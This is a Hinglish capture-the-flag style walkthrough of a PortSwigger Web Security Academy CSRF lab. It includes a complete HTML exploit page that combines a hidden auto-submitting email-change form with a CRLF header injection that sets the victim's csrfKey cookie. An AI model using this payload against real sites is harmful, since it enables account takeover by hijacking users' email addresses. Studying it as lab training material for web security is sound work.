## ✅ CSRF Lab Solution – Step-by-Step (Professional Format)

1. **Burp Suite start kiya** aur browser ko Burp ke sath intercept mode mein chala diya.

2. Lab ki website open ki aur **login page** par gaya.

3. `wiener:peter` credentials se login kiya.

4. Login hone ke baad **“Update email”** wale section mein gaya.

5. Wahan test ke liye ek naya email submit kiya:

   ```
   test@tesss.com
   ```

6. Burp Suite ke Proxy tab mein gaya aur **POST /my-account/change-email** wali request capture ki.

7. Is request se **`csrfKey` (cookie)** aur **`csrf` (form token)** copy kiye.

8. Uske baad **exploit server** open kiya aur **Body** section mein neeche wala HTML payload paste kiya:

   ```html
   <html>
     <body>
       <form action="https://0a34004b04b3113980fccbd8007800ab.web-security-academy.net/my-account/change-email" method="POST">
         <input type="hidden" name="email" value="sdasevil@sadevil.com">
         <input type="hidden" name="csrf" value="pB4M7BHMIn2hQROcR2z0OfnnwldxwoQz">
       </form>
       <img src="https://0a34004b04b3113980fccbd8007800ab.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=6LbtJoTyKY8c3VPKhrKwB6sB3Mmj2VMT%3b%20SameSite=None" onerror="document.forms[0].submit()">
     </body>
   </html>
   ```

9. Is payload mein:

   * `form action` aur `img src` dono mein **apna lab URL** use kiya.
   * Email field mein **nayi attacker email** dali: `sdasevil@sadevil.com`
   * Form ke CSRF field mein **`wiener` ka token** paste kiya.
   * Image tag ke andar `%0d%0aSet-Cookie` ke zariye **`wiener` ki csrfKey** inject ki.

10. Payload save kiya aur **“Deliver to victim”** button click kiya.

11. Result: Victim ka email change ho gaya aur **lab successfully solve** ho gaya. ✅
